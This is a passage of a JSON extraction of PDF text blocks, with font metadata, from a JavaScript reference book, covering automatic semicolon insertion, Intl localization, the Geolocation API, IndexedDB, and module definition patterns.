        "img": []
    },
    {
        "text": "Section 69.2: Rules of Automatic Semicolon Insertion",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are three basic rules of semicolon insertion:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 362",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When, as the program is parsed from left to right, a token (called the  o\ufb00ending token ) is 1. encountered that is not allowed by any production of the grammar, then a semicolon is automatically inserted before the o\ufb00ending token if one or more of the following conditions is true: The o\ufb00ending token is separated from the previous token by at least one  LineTerminator . The o\ufb00ending token is  } . When, as the program is parsed from left to right, the end of the input stream of tokens is 2. encountered and the parser is unable to parse the input token stream as a single complete ECMAScript  Program , then a semicolon is automatically inserted at the end of the input stream. When, as the program is parsed from left to right, a token is encountered that is allowed by some 3. production of the grammar, but the production is a  restricted production  and the token would be the \ufb01rst token for a terminal or nonterminal immediately following the annotation \"[no LineTerminator  here]\" within the restricted production (and therefore such a token is called a restricted token), and the restricted token is separated from the previous token by at least one LineTerminator , then a semicolon is automatically inserted before the restricted token. However, there is an additional overriding condition on the preceding rules: a semicolon is never inserted automatically if the semicolon would then be parsed as an empty statement or if that semicolon would become one of the two semicolons in the header of a  for  statement (see 12.6.3).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Source:  ECMA-262, Fifth Edition ECMAScript Speci\ufb01cation:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 69.3: Statements a\ue023ected by automatic semicolon insertion",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "empty statement var  statement expression statement do - while  statement continue  statement break  statement return  statement throw  statement",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When the end of the input stream of tokens is encountered and the parser is unable to parse the input token stream as a single complete Program, then a semicolon is automatically inserted at the end of the input stream.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  b ++ c",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is transformed to:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =  b ; ++ c ; x ++ y",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is transformed to: x ;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "++ y ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array indexing/literals",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 363",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"Hello, World\" ) [ 1 , 2 , 3 ] . join ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is transformed to:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Hello, World\" )[( 1 ,   2 ,   3 )] . join ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Return statement:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "return",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   \"something\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is transformed to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "return ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   \"something\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 364",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 70: Localization",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Paramater Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "weekday \"narrow\", \"short\", \"long\" era \"narrow\", \"short\", \"long\" year \"numeric\", \"2-digit\" month \"numeric\", \"2-digit\", \"narrow\", \"short\", \"long\" day \"numeric\", \"2-digit\" hour \"numeric\", \"2-digit\" minute \"numeric\", \"2-digit\" second \"numeric\", \"2-digit\" timeZoneName \"short\", \"long\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 70.1: Number formatting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Number formatting, grouping digits according to the localization.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  usNumberFormat  =   new  Intl. NumberFormat ( 'en-US' ); const  esNumberFormat  =   new  Intl. NumberFormat ( 'es-ES' ); const  usNumber  =  usNumberFormat. format ( 99999999.99 );   // \"99,999,999.99\" const  esNumber  =  esNumberFormat. format ( 99999999.99 );   // \"99.999.999,99\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 70.2: Currency formatting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Currency formatting, grouping digits and placing the currency symbol according to the localization.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  usCurrencyFormat  =   new  Intl. NumberFormat ( 'en-US' ,   { style :   'currency' ,  currency :   'USD' }) const  esCurrencyFormat  =   new  Intl. NumberFormat ( 'es-ES' ,   { style :   'currency' ,  currency :   'EUR' }) const  usCurrency  =  usCurrencyFormat. format ( 100.10 );   // \"$100.10\" const  esCurrency  =  esCurrencyFormat. format ( 100.10 );   // \"100.10  \u20ac \"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 70.3: Date and time formatting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Date time formatting, according to the localization.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  usDateTimeFormatting  =   new  Intl. DateTimeFormat ( 'en-US' ); const  esDateTimeFormatting  =   new  Intl. DateTimeFormat ( 'es-ES' ); const  usDate  =  usDateTimeFormatting. format ( new  Date ( '2016-07-21' ));   // \"7/21/2016\" const  esDate  =  esDateTimeFormatting. format ( new  Date ( '2016-07-21' ));   // \"21/7/2016\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 365",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 71: Geolocation",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 71.1: Get updates when a user's location changes",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can also receive regular updates of the user's location; for example, as they move around while using a mobile device. Location tracking over time can be very sensitive, so be sure to explain to the user ahead of time why you're requesting this permission and how you'll use the data.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( navigator. geolocation )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //after the user indicates that they want to turn on continuous location-tracking",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  watchId  =  navigator. geolocation . watchPosition ( updateLocation ,  geolocationFailure ); }   else   {     console. log ( \"Geolocation is not supported by this browser.\" ); } var  updateLocation  =   function ( position )   {     console. log ( \"New position at: \"   +  position. coords . latitude   +   \", \"   +  position. coords . longitude ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To turn o\ufb00 continuous updates:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "navigator. geolocation . clearWatch ( watchId );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 71.2: Get a user's latitude and longitude",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "if   ( navigator. geolocation )   {   navigator. geolocation . getCurrentPosition ( geolocationSuccess ,  geolocationFailure ); }   else   {   console. log ( \"Geolocation is not supported by this browser.\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Function that will be called if the query succeeds",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  geolocationSuccess  =   function ( pos )   {   console. log ( \"Your location is \"   +  pos. coords . latitude   +   \" \u00b0 , \"   +  pos. coords . longitude   +   \" \u00b0 .\" ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Function that will be called if the query fails",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  geolocationFailure  =   function ( err )   {   console. log ( \"ERROR (\"   +  err. code   +   \"): \"   +  err. message ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 71.3: More descriptive error codes",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In the event that geolocation fails, your callback function will receive a  PositionError  object. The object will include an attribute named  code  that will have a value of  1 ,  2 , or  3 . Each of these numbers signi\ufb01es a di\ufb00erent kind of error; the  getErrorCode ()  function below takes the  PositionError. code  as its only argument and returns a string with the name of the error that occurred.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  getErrorCode  =   function ( err )   {    switch   ( err. code )   {      case  err. PERMISSION_DENIED :        return   \"PERMISSION_DENIED\" ;      case  err. POSITION_UNAVAILABLE :        return   \"POSITION_UNAVAILABLE\" ;      case  err. TIMEOUT :        return   \"TIMEOUT\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 366",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     default :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return   \"UNKNOWN_ERROR\" ;    } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It can be used in  geolocationFailure ()  like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  geolocationFailure  =   function ( err )   {   console. log ( \"ERROR (\"   +  getErrorCode ( err )   +   \"): \"   +  err. message ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 367",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 72: IndexedDB",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 72.1: Opening a database",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Opening a database is an asynchronous operation. We need to send a request to open our database and then listen for events so we know when it's ready. We'll open a DemoDB database. If it doesn't exist yet, it will get created when we send the request. The  2  below says that we're asking for version 2 of our database. Only one version exists at any time, but we can use the version number to upgrade old data, as you'll see.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  db  =   null ,   // We'll use this once we have our database",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    request  =  window. indexedDB . open ( \"DemoDB\" ,   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Listen for success. This will be called after onupgradeneeded runs, if it does at all",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "request. onsuccess   =   function ()   {     db  =  request. result ;   // We have a database!     doThingsWithDB ( db ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// If our database didn't exist before, or it was an older version than what we requested, // the `onupgradeneeded` event will be fired. // // We can use this to setup a new database and upgrade an old one with new data stores",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "request. onupgradeneeded   =   function ( event )   {     db  =  request. result ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // If the oldVersion is less than 1, then the database didn't exist. Let's set it up",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( event. oldVersion   <   1 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // We'll create a new \"things\" store with `autoIncrement`ing keys",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  store  =  db. createObjectStore ( \"things\" ,   {  autoIncrement :   true   });      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // In version 2 of our database, we added a new index by the name of each thing",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( event. oldVersion   <   2 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Let's load the things store and create an index",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  store  =  request. transaction . objectStore ( \"things\" );         store. createIndex ( \"by_name\" ,   \"name\" );      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Handle any errors",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "request. onerror   =   function ()   {     console. error ( \"Something went wrong when we tried to request the database!\" ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 72.2: Adding objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Anything that needs to happen with data in an IndexedDB database happens in a transaction. There are a few things to note about transactions that are mentioned in the Remarks section at the bottom of this page. We'll use the database we set up in  Opening a database.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Create a new readwrite (since we want to change things) transaction for the things store",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  transaction  =  db. transaction ([ \"things\" ],   \"readwrite\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 368",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Transactions use events, just like database open requests. Let's listen for success",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "transaction. oncomplete   =   function ()   {     console. log ( \"All done!\" ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// And make sure we handle errors",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "transaction. onerror   =   function ()   {     console. log ( \"Something went wrong with our transaction: \" ,  transaction. error ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Now that our event handlers are set up, let's get our things store and add some objects!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  store  =  transaction. objectStore ( \"things\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Transactions can do a few things at a time. Let's start with a simple insertion",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  request  =  store. add ({",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // \"things\" uses auto-incrementing keys, so we don't need one, but we can set it anyway",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    key :   \"coffee_cup\" ,     name :   \"Coffee Cup\" ,     contents :   [ \"coffee\" ,   \"cream\" ] });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Let's listen so we can see if everything went well",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "request. onsuccess   =   function ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Done! Here, `request.result` will be the object's key, \"coffee_cup\" }; // We can also add a bunch of things from an array. We'll use auto-generated keys",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  thingsToAdd  =   [{  name :   \"Example object\"   },   {  value :   \"I don't have a name\"   }];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Let's use more compact code this time and ignore the results of our insertions",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "thingsToAdd. forEach ( e  =>  store. add ( e ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 72.3: Retrieving data",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Anything that needs to happen with data in an IndexedDB database happens in a transaction. There are a few things to note about transactions that are mentioned in the Remarks section at the bottom of this page. We'll use the database we set up in Opening a database.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Create a new transaction, we'll use the default \"readonly\" mode and the things store",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  transaction  =  db. transaction ([ \"things\" ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Transactions use events, just like database open requests. Let's listen for success",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "transaction. oncomplete   =   function ()   {     console. log ( \"All done!\" ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// And make sure we handle errors",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "transaction. onerror   =   function ()   {     console. log ( \"Something went wrong with our transaction: \" ,  transaction. error ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Now that everything is set up, let's get our things store and load some objects!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  store  =  transaction. objectStore ( \"things\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// We'll load the coffee_cup object we added in Adding objects",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  request  =  store. get ( \"coffee_cup\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 369",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Let's listen so we can see if everything went well",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "request. onsuccess   =   function ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // All done, let's log our object to the console",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( request. result ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// That was pretty long for a basic retrieval. If we just want to get just // the one object and don't care about errors, we can shorten things a lot",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "db. transaction ( \"things\" ) . objectStore ( \"things\" )     . get ( \"coffee_cup\" ) . onsuccess   =  e  =>  console. log ( e. target . result );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 72.4: Testing for IndexedDB availability",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can test for IndexedDB support in the current environment by checking for the presence of the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. indexedDB  property: if   ( window. indexedDB )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // IndexedDB is available }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 370",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 73: Modularization Techniques",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 73.1: ES6 Modules",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In ECMAScript 6, when using the module syntax (import/export), each \ufb01le becomes its own module with a private namespace. Top-level functions and variables do not pollute the global namespace. To expose functions, classes, and variables for other modules to import, you can use the export keyword. Note:  Although this is the o\ufb03cial method for creating JavaScript modules, it is not supported by any major browsers right now. However, ES6 Modules are supported by many transpilers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "export   function  greet ( name )   {     console. log ( \"Hello %s!\" ,  name ); } var  myMethod  =   function ( param )   {      return   \"Here's what you said: \"   +  param ; }; export   { myMethod } export   class  MyClass  {     test ()   {} }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using Modules",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Importing modules is as simple as specifying their path:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import  greet from  \"mymodule.js\" ; greet ( \"Bob\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This imports only the  myMethod  method from our  mymodule. js  \ufb01le. It's also possible to import all methods from a module:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   *  as myModule from  \"mymodule.js\" ; myModule. greet ( \"Alice\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also import methods under a new name:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   {  greet as A ,  myMethod as B  }  from  \"mymodule.js\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More information on ES6 Modules can be found in the Modules topic.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.2: Universal Module De\ufb01nition (UMD)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The UMD (Universal Module De\ufb01nition) pattern is used when our module needs to be imported by a number of di\ufb00erent module loaders (e.g. AMD, CommonJS). The pattern itself consists of two parts:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 371",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "An IIFE (Immediately-Invoked Function Expression) that checks for the module loader that is being 1. implemented by the user. This will take two arguments;  root  (a  this  reference to the global scope) and factory  (the function where we declare our module). An anonymous function that creates our module. This is passed as the second argument to the IIFE portion 2. of the pattern. This function is passed any number of arguments to specify the dependencies of the module. In the below example we check for AMD, then CommonJS. If neither of those loaders are in use we fall back to making the module and its dependencies available globally.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function   ( root ,  factory )   {      if   ( typeof  define  ===   'function'   &&  define. amd )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // AMD. Register as an anonymous module.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        define ([ 'exports' ,   'b' ],  factory );      }   else   if   ( typeof  exports  ===   'object'   &&   typeof  exports. nodeName   !==   'string' )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // CommonJS",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        factory ( exports ,  require ( 'b' ));      }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Browser globals",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        factory (( root. commonJsStrict   =   {}),  root. b );      } }( this ,   function   ( exports ,  b )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //use b in some fashion.      // attach properties to the exports object to define      // the exported module properties.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    exports. action   =   function   ()   {}; }));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 73.3: Immediately invoked function expressions (IIFE)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Immediately invoked function expressions can be used to create a private scope while producing a public API.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Module  =   ( function ()   {    var  privateData  =   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    getPrivateData :   function ()   {        return  privateData ;      }    }; })(); Module. getPrivateData ();   // 1 Module. privateData ;   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "See the Module Pattern for more details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 73.4: Asynchronous Module De\ufb01nition (AMD)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "AMD is a module de\ufb01nition system that attempts to address some of the common issues with other systems like CommonJS and anonymous closures. AMD addresses these issues by: Registering the factory function by calling de\ufb01ne(), instead of immediately executing it Passing dependencies as an array of module names, which are then loaded, instead of using globals Only executing the factory function once all the dependencies have been loaded and executed",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 372",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Passing the dependent modules as arguments to the factory function The key thing here is that a module can have a dependency and not hold everything up while waiting for it to load, without the developer having to write complicated code. Here's an example of AMD:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Define a module \"myModule\" with two dependencies, jQuery and Lodash",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "define ( \"myModule\" ,   [ \"jquery\" ,   \"lodash\" ],   function ( $ ,  _ )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // This publicly accessible object is our module      // Here we use an object, but it can be of any type",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  myModule  =   {};      var  privateVar  =   \"Nothing outside of this module can see me\" ;      var  privateFn  =   function ( param )   {          return   \"Here's what you said: \"   +  param ;      };     myModule. version   =   1 ;     myModule. moduleMethod   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // We can still access global variables from here, but it's better          // if we use the passed ones",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return  privateFn ( windowTitle );      };      return  myModule ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Modules can also skip the name and be anonymous. When that's done, they're usually loaded by \ufb01le name.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "define ([ \"jquery\" ,   \"lodash\" ],   function ( $ ,  _ )   {   /* factory */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "They can also skip dependencies:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "define ( function ()   {   /* factory */   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Some AMD loaders support de\ufb01ning modules as plain objects:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "define ( \"myModule\" ,   {  version :   1 ,  value :   \"sample string\"   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 73.5: CommonJS - Node.js",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
